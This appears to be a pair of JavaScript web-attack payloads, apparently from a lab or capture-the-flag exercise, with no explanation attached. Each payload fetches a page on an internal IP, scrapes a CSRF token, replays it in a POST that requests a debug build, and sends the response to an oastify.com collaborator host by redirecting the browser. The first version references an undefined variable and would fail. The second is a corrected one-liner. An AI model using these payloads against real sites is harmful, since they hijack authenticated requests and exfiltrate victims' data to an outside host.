
fetch('http://172.31.54.71/build/tokenpage.php').then(
    r=>r.text()).then(
        h=>{
            let t=h.match(/<div.class..token-box.>(.+?)<.div>/);   
            const csrfToken = match ? match[1] : null;
            if(!csrfToken)throw'No token';
            let b=`token=${encodeURIComponent(csrfToken)}&build=isdebug`;
            return fetch('http://172.31.54.71/build/tokenpage.php',{
                method:'POST',
                headers:{'Content-Type':'application/x-www-form-urlencoded'},
                body:b})}).then(
                    r=>r.text()).then(
                        d=>{location='https://w0x8jpc02kmz9334fhwst2c9d0jr7hv6.oastify.com/?data='+encodeURIComponent(d)})


fetch('http://172.31.54.71/build/tokenpage.php').then(r=>r.text()).then(h=>{let t=h.match(/[a-zA-Z0-9/+]{20,}={0,2}/);if(!t)throw'No token';let b=`token=${encodeURIComponent(t[0])}&build=isdebug`;return fetch('http://172.31.54.71/build/tokenpage.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:b})}).then(r=>r.text()).then(d=>{location='http://5aghtym9ctw8jcddpq613bmin9t0hr5g.oastify.com/?data='+encodeURIComponent(d)}).catch(console.error)
